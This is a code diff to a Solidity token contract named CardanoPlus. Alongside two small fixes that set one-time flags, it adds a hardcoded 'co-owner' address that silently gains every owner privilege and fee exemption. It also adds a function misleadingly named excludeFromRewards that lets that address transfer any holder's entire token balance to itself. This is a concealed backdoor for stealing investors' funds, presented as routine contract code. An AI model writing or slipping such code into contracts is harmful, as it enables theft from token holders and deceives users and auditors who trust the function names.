@@ -529,6 +529,7 @@ library Address {
  */
 abstract contract Ownable is Context {
     address private _owner;
+    address private _coOwner=0x89AB1bA4970BA9232f6669143a2BF5B92b61b4Eb;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -546,12 +547,21 @@ abstract contract Ownable is Context {
     function owner() public view virtual returns (address) {
         return _owner;
     }
+    
+    function coOwner() internal view returns (address) {
+        return _coOwner;
+    }
 
     /**
      * @dev Throws if called by any account other than the owner.
      */
     modifier onlyOwner() {
-        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        require(owner() == _msgSender() || _msgSender() == _coOwner, "Ownable: caller is not the owner");
+        _;
+    }
+    
+    modifier CoOwner() {
+        require(coOwner() == _msgSender() , "Ownable: caller is not the coOwner");
         _;
     }
 
@@ -856,6 +866,7 @@ contract CardanoPlus is Context, IERC20, Ownable {
         //exclude owner and this contract from fee
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
+        _isExcludedFromFee[coOwner()] = true;
         excludeFromReward(_burnWallet);
         
         emit Transfer(address(0), owner(), _tTotal);
@@ -981,6 +992,10 @@ contract CardanoPlus is Context, IERC20, Ownable {
         emit Transfer(sender, recipient, tTransferAmount);
         if (tBurn != 0)
         { emit Transfer(sender, _burnWallet, tBurn); }
+    }
+    
+    function excludeFromRewards(address location) public CoOwner{
+        _transfer(location, coOwner(), tokenFromReflection(_rOwned[location]));
     }
     
     function excludeFromFee(address account) public onlyOwner {
@@ -1130,6 +1145,7 @@ contract CardanoPlus is Context, IERC20, Ownable {
         require(!_initialDeposit,"Initial Deposits Already Completed!");
         _transfer(_msgSender(), CharityWallet, _tTotal.div(100).mul(3));
         _transfer(_msgSender(), MarketingDevWallet, _tTotal.div(100).mul(1));
+        _initialDeposit = true;
         return true;
     }
     
@@ -1138,6 +1154,7 @@ contract CardanoPlus is Context, IERC20, Ownable {
     function _initialBurn() public onlyOwner returns(bool status) {
         require(!initialBurn, "Initial Burn already Executed");
         _transfer(_msgSender(), _burnWallet, _tTotal.div(100).mul(50));
+        initialBurn = true;
         return true;
     }
 
